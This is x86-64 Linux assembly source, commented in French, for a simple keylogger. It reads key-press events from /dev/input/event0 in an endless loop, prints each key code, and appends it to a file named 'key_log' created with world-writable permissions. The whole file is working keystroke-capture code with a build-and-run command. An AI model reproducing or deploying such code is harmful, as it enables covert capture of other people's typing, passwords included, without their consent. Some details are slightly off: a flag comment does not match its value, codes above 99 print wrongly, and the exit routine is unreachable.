section .data
    key_log db "key_log", 0

    event0_file_path db "/dev/input/event0"
    fd dq 0

section .bss
    temp resb 3
    buffer resb 24

section .text
    global _start

_start:
    mov rax, 2 ; open
    mov rdi, event0_file_path
    mov rsi, 0
    mov rdx, 0
    syscall

    mov [fd], rax

reading_new_key:
    mov rax, 0 ; read
    mov rdi, [fd]
    mov rsi, buffer
    mov rdx, 24
    syscall
    ; mov r8, rax

    ; type
    ; mov ax, [buffer + 16]
    ; code
    ; mov bx, [buffer + 18]
    ; value
    ; mov ecx, [buffer + 20]

    mov ax, [buffer + 16] ; type
    cmp ax, 1             ; ev_key
    jne reading_new_key

    mov eax, [buffer + 20]  ; value
    cmp eax, 1              ; press
    jne reading_new_key

    movzx rax, word [buffer + 18] ; code
    mov rbx, 10
    xor rdx, rdx
    div rbx                        ; rax = quotient, rdx = reste
    add al, '0'                     ; quotient → ASCII
    add dl, '0'                     ; reste → ASCII
    mov [temp], al
    mov [temp+1], dl
    mov rax, 1
    mov rdi, 1
    mov rsi, temp
    mov rdx, 3
    syscall

    jmp write_key

write_key:
    mov rax, 2 ; sys_open()
    mov rdi, key_log
    mov rsi, 2 | 64 | 1024  ; O_WRONLY | O_CREAT | O_APPEND
    mov rdx, 0777o        ; Permissions
    syscall

    ; après l’exécution du syscall, rax contient le résultat
    ; il crée un fd (autre que ceux standard) et le sys_write écrit dedans
    mov rbx, rax

    mov rax, 1 ; sys_write()
    mov rdi, rbx
    mov rsi, temp
    mov rdx, 3
    syscall

    mov rax, 3 ; sys_close()
    mov rdi, rbx
    syscall

    jmp reading_new_key

exit:
    mov rax, 3 ; close
    mov rdi, [fd]
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall

; nasm -f elf64 read_event.asm ; ld read_event.o -o read_event ; ./read_event